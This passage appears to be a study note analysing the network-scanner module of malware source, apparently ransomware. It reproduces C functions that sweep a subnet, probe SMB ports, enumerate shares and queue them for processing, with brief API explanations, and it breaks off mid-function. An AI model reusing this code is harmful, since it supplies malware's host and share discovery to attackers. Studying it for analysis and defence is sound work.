  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);`</span><br><span class="line"></span><br><span class="line">    - get the host&#x27;s shareinfo </span><br><span class="line"></span><br><span class="line">- `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);`</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line">HostHandler(__in PVOID pArg)</span><br><span class="line">&#123;</span><br><span class="line">	network_scanner::SHARE_LIST ShareList;</span><br><span class="line">	TAILQ_INIT(&amp;ShareList);</span><br><span class="line"></span><br><span class="line">	while (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">		pEnterCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList);</span><br><span class="line">		if (HostInfo == NULL) &#123;</span><br><span class="line"></span><br><span class="line">			pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">			pSleep(1000);</span><br><span class="line">			continue;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line">		pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">		if (HostInfo-&gt;dwAddres == STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line">			free(HostInfo);</span><br><span class="line">			pExitThread(EXIT_SUCCESS);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList);</span><br><span class="line">		while (!TAILQ_EMPTY(&amp;ShareList))</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);</span><br><span class="line">			logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath);</span><br><span class="line">			threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);</span><br><span class="line">			TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries);</span><br><span class="line">			free(ShareInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		free(HostInfo);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pExitThread(EXIT_SUCCESS);</span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="CreateHostTable"><a href="#CreateHostTable" class="headerlink" title="CreateHostTable"></a>CreateHostTable</h4><ul>
<li>WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);<ul>
<li>socket with tcp</li>
</ul>
</li>
<li>bind<ul>
<li>The <strong>bind</strong> function associates a local address with a socket.</li>
</ul>
</li>
<li>CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)<ul>
<li>Creates an input&#x2F;output (I&#x2F;O) completion port and associates it with a specified file handle, or creates an I&#x2F;O completion port that is not yet associated with a file handle, allowing association at a later time.</li>
<li>If the function succeeds, the return value is the handle to an I&#x2F;O completion port</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CreateHostTable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList);</span><br><span class="line">	<span class="keyword">if</span> (!SubnetInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">	DWORD dwAddress;</span><br><span class="line">	RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (BYTE i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">		bAddres[<span class="number">3</span>] = i;</span><br><span class="line">		RtlCopyMemory(&amp;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, <span class="keyword">sizeof</span>(CONNECT_CONTEXT));</span><br><span class="line">		<span class="keyword">if</span> (!ConnectCtx) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ConnectCtx-&gt;dwAddres = dwAddress;</span><br><span class="line">		ConnectCtx-&gt;State = NOT_CONNECTED;</span><br><span class="line">		ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, WSA_FLAG_OVERLAPPED);</span><br><span class="line">		<span class="keyword">if</span> (ConnectCtx-&gt;s == INVALID_SOCKET) &#123;</span><br><span class="line"></span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, <span class="keyword">sizeof</span>(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = <span class="number">0</span>;</span><br><span class="line">		SockAddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, <span class="keyword">sizeof</span>(SockAddr)) != ERROR_SUCCESS) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">			pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">			pGlobalFree(ConnectCtx);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries);</span><br><span class="line">	<span class="built_in">free</span>(SubnetInfo);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ScanHosts"><a href="#ScanHosts" class="headerlink" title="ScanHosts"></a>ScanHosts</h4><ul>
<li><p>ConnectEx</p>
<ul>
<li><p>The <strong>ConnectEx</strong> function establishes a connection to a specified socket, and optionally sends data once the connection is established. The <strong>ConnectEx</strong> function is only supported on connection-oriented sockets.</p>
<ul>
<li><p>&#96;&#96;&#96;<br>  LPFN_CONNECTEX LpfnConnectex;</p>
<p>  BOOL LpfnConnectex(<br>[in]           SOCKET s,<br>[in]           const sockaddr *name,<br>[in]           int namelen,<br>[in, optional] PVOID lpSendBuffer,<br>[in]           DWORD dwSendDataLength,<br>[out]          LPDWORD lpdwBytesSent,<br>[in]           LPOVERLAPPED lpOverlapped<br>  )<br>  {…}</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">STATIC</span><br><span class="line">VOID</span><br><span class="line">ScanHosts()</span><br><span class="line">&#123;</span><br><span class="line">	PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">	TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD dwBytesSent;</span><br><span class="line">		SOCKADDR_IN SockAddr;</span><br><span class="line">		RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr));</span><br><span class="line">		SockAddr.sin_family = AF_INET;</span><br><span class="line">		SockAddr.sin_port = htons(SMB_PORT);</span><br><span class="line">		SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres;</span><br><span class="line"></span><br><span class="line">		if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) &#123;</span><br><span class="line"></span><br><span class="line">			ConnectCtx-&gt;State = CONNECTED;</span><br><span class="line">			AddHost(ConnectCtx-&gt;dwAddres);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		else if (WSA_IO_PENDING == WSAGetLastError()) &#123;</span><br><span class="line"></span><br><span class="line">			g_ActiveOperations++;</span><br><span class="line">			ConnectCtx-&gt;State = CONNECTING;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="AddHost"><a href="#AddHost" class="headerlink" title="AddHost"></a>AddHost</h4><ul>
<li>add the new-found host to the Host table</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">AddHost</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in DWORD dwAddres</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_HostEntry) &#123;</span><br><span class="line">		INT i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (g_HostEntry-&gt;h_addr_list[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++];</span><br><span class="line">			<span class="keyword">if</span> (dwCurrentAddr == dwAddres) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(<span class="keyword">sizeof</span>(HOST_INFO));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!HostInfo) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwAddress = INET_ADDRSTRLEN;</span><br><span class="line">	SOCKADDR_IN temp;</span><br><span class="line">	temp.sin_addr.s_addr = dwAddres;</span><br><span class="line">	temp.sin_port = <span class="number">0</span>;</span><br><span class="line">	temp.sin_family = AF_INET;</span><br><span class="line">	HostInfo-&gt;dwAddres = dwAddres;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwAddres != STOP_MARKER) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, <span class="keyword">sizeof</span>(temp), <span class="literal">NULL</span>, HostInfo-&gt;wszAddress, &amp;dwAddres)) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(HostInfo);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pEnterCriticalSection(&amp;g_CriticalSection); &#123;</span><br><span class="line"></span><br><span class="line">		TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	pLeaveCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="PortScanHandler"><a href="#PortScanHandler" class="headerlink" title="PortScanHandler"></a>PortScanHandler</h4><p>this handler use the <code>CompletionStatus,IsTimerActivated,g_ActiveOperations</code> to control the code flow.</p>
<ul>
<li>g_ActiveOperations<ul>
<li>use to count the Socket.</li>
<li><code>ScanHosts</code> function: when one host is found ,the value is add by one</li>
<li>if <code>CompletionStatus == CONNECT_COMPLETION_KEY</code>, the value sub by one.</li>
</ul>
</li>
<li>IsTimerActivated<ul>
<li>used to check after the timer.<ul>
<li>IsTimerActivated is True,</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>four scenes</p>
<ol>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success</p>
<ol>
<li><p>if g_ActiveOperations is zero ,then scanHost again</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!g_ActiveOperations &amp;&amp; IsTimerActivated) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<pre><code> if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) &#123;
 
     ConnectContext-&gt;State = CONNECTED;
     AddHost(ConnectContext-&gt;dwAddres);
 
 &#125;
</code></pre>
</li>
</ol>
</li>
<li><p>CompletionStatus &#x3D;&#x3D; CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail</p>
<ol>
<li>the same as before</li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">			ConnectContext-&gt;State = NOT_CONNECTED;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>CompletionStatus &#x3D;&#x3D; TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = NULL;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					if (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><code>CompletionStatus == TIMER_COMPLETION_KEY and  g_ActiveOperations == 0</code> , the socket is out-of-time.</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">				pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">				pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">				TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">				pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ScanHosts();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">				pExitThread(EXIT_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = FALSE;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>CompletionStatus </p>
<ul>
<li>A pointer to a variable that receives the completion key value associated with the file handle whose I&#x2F;O operation has completed. A completion key is a per-file key that is specified in a call to <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/FileIO/createiocompletionport">CreateIoCompletionPort</a>.<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
</ul>
</li>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">PortScanHandler</span><span class="params">(PVOID pArg)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	HANDLE hTimer = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL IsTimerActivated = FALSE;</span><br><span class="line"></span><br><span class="line">	HANDLE hTimerQueue = pCreateTimerQueue();</span><br><span class="line">	<span class="keyword">if</span> (!hTimerQueue) &#123;</span><br><span class="line">		